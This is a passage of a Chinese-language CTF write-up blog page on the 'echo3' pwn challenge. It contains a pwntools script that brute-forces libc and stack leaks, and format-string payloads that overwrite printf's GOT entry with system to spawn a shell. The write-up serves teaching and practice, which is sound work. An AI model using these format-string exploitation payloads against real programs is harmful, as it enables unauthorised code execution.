class="number">0144</span>│      <span class="number">0xffbf8bb0</span> —▸ <span class="number">0x8048800</span> (__libc_csu_fini) ◂— ret    </span><br><span class="line"><span class="number">52</span>:<span class="number">0148</span>│      <span class="number">0xffbf8bb4</span> —▸ <span class="number">0xf77d7880</span> (_dl_fini) ◂— push   ebp</span><br><span class="line"><span class="number">53</span>:<span class="number">014</span>c│      <span class="number">0xffbf8bb8</span> —▸ <span class="number">0xffbf8bbc</span> —▸ <span class="number">0xf77ec918</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">54</span>:<span class="number">0150</span>│      <span class="number">0xffbf8bbc</span> —▸ <span class="number">0xf77ec918</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">55</span>:<span class="number">0154</span>│      <span class="number">0xffbf8bc0</span> ◂— <span class="number">0x1</span></span><br><span class="line">56:0158│      0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'	//偏移为85</span><br><span class="line"><span class="number">57</span>:<span class="number">015</span>c│      <span class="number">0xffbf8bc8</span> ◂— <span class="number">0x0</span></span><br><span class="line">58:0160│      0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')	//偏移为87</span><br><span class="line">59:0164│      0xffbf8bd0 —▸ 0xffbfa2db ◂— 0x5f474458 ('XDG_')</span><br><span class="line">5a:0168│      0xffbf8bd4 —▸ 0xffbfa30d ◂— 0x4d4f4e47 ('GNOM')</span><br><span class="line">5b:016c│      0xffbf8bd8 —▸ 0xffbfa339 ◂— 0x435f434c ('LC_C')</span><br><span class="line">5c:0170│      0xffbf8bdc —▸ 0xffbfa34e ◂— 0x5f474458 ('XDG_')</span><br><span class="line">5d:0174│      0xffbf8be0 —▸ 0xffbfa368 ◂— 0x5f474458 ('XDG_')</span><br><span class="line">5e:0178│      0xffbf8be4 —▸ 0xffbfa37d ◂— 0x495f5451 ('QT_I')</span><br><span class="line">5f:017c│      0xffbf8be8 —▸ 0xffbfa38f ◂— 'LOGNAME=zs0zrc'</span><br><span class="line">60:0180│      0xffbf8bec —▸ 0xffbfa39e ◂— 'USER=zs0zrc'</span><br><span class="line">61:0184│      0xffbf8bf0 —▸ 0xffbfa3aa ◂— 0x48544150 ('PATH')</span><br><span class="line">62:0188│      0xffbf8bf4 —▸ 0xffbfa43b ◂— 'XDG_VTNR=7'</span><br><span class="line">63:018c│      0xffbf8bf8 —▸ 0xffbfa446 ◂— 0x4d4f4e47 ('GNOM')</span><br></pre></td></tr></table></figure>
+<p>先爆破，泄露出libc地址和栈的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    p = process(<span class="string">'./echo3'</span>)</span><br><span class="line">    payload = <span class="string">'%43$p#%30$p'</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recvuntil(<span class="string">'#'</span>,drop = <span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">leak_libc = int(data,<span class="number">16</span>) - <span class="number">247</span></span><br><span class="line">libc_base = leak_libc - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.info(<span class="string">"libc address &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">leak_stack = int(p.recv().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">"leak stack address&#123;&#125;"</span>.format(hex(leak_stack)))</span><br><span class="line">stack1 = leak_stack - <span class="number">0x10c</span></span><br><span class="line">stack2 = leak_stack - <span class="number">0x108</span></span><br></pre></td></tr></table></figure>
+<p>因为格式化字符串在bss段上，所以先要在栈上找到指向栈的指针，这里用到的是</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1f:007c│      0xffbf8ae8 —▸ 0xffbf8bcc —▸ 0xffbfa2ba ◂— 0x515f5451 ('QT_Q')</span><br><span class="line">20:0080│      0xffbf8aec —▸ 0xffbf8bc4 —▸ 0xffbfa2b2 ◂— './echo3'</span><br></pre></td></tr></table></figure>
+<p>修改为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1f</span>:<span class="number">007</span>c│      <span class="number">0xffbf8ae8</span> —▸ <span class="number">0xffbf8bcc</span> —▸<span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_)</span><br><span class="line"><span class="number">20</span>:<span class="number">0080</span>│      <span class="number">0xffbf8aec</span> —▸ <span class="number">0xffbf8bc4</span> —▸<span class="number">0x804a060</span> (magic)</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(stack1 &amp; <span class="number">0xffff</span>, <span class="number">30</span>)</span><br><span class="line">payload1 += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(<span class="number">4</span>, <span class="number">31</span>)</span><br><span class="line">payload1 += <span class="string">'1111'</span></span><br></pre></td></tr></table></figure>
+<p>这时再通过修改0xffbf8bcc和0xffbf8bc4 的内容为 print_got和printf_got+2</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">32</span>:<span class="number">00</span>c8│      <span class="number">0xffbf8b34</span> —▸ <span class="number">0xffbf8bc4</span> —▸ <span class="number">0xffbf8ac4</span> —▸ <span class="number">0x804a014</span></span><br><span class="line"><span class="number">33</span>:<span class="number">00</span>cc│      <span class="number">0xffbf8b38</span> —▸ <span class="number">0xffbf8bcc</span> —▸ <span class="number">0xffbf8ac0</span> —▸ <span class="number">0x804a016</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(printf_got &amp; <span class="number">0xffff</span>, <span class="number">85</span>)</span><br><span class="line">payload2 += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(<span class="number">2</span>, <span class="number">87</span>)</span><br><span class="line">payload2 += <span class="string">"2222"</span></span><br></pre></td></tr></table></figure>
+<p>最后向printf_got中写入system函数地址，发送’/bin/sh\x00’字符串，getshell</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload3 = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(system&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, <span class="number">20</span>)</span><br><span class="line">payload3 += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format((system&amp; <span class="number">0xffff</span>) - (system &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>), <span class="number">21</span>)</span><br><span class="line">payload3 += <span class="string">"3333"</span></span><br></pre></td></tr></table></figure>
+<p>在这里膜下M4X大佬和D4rk3r大佬<br>参考了他们的wirteup<br><a href="https://www.cnblogs.com/WangAoBo/p/hackme_inndy_writeup.html#_label8" target="_blank" rel="noopener">M4X</a><br><a href="https://www.jianshu.com/p/36d1b0a0e622" target="_blank" rel="noopener">D4rk3r</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/30/2018-9-30-堆利用的总结/" rel="next" title="堆利用的一些总结">
+                <i class="fa fa-chevron-left"></i> 堆利用的一些总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/04/2018-10-3-petbook-writeup/" rel="prev" title="petbook writeup">
+                petbook writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
+            
+              <p class="site-author-name" itemprop="name">zs0zrc</p>
+              <p class="site-description motion-element" itemprop="description">zs0zrc's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://myhackerworld.top/" title="D4rk3r" target="_blank">D4rk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://m4x.fun/" title="M4X" target="_blank">M4X</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz',
+        appKey: 'uYeHUkgtbToPh4mGzE7YJXNe',
+        placeholder: 'pwn pwn pwn',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
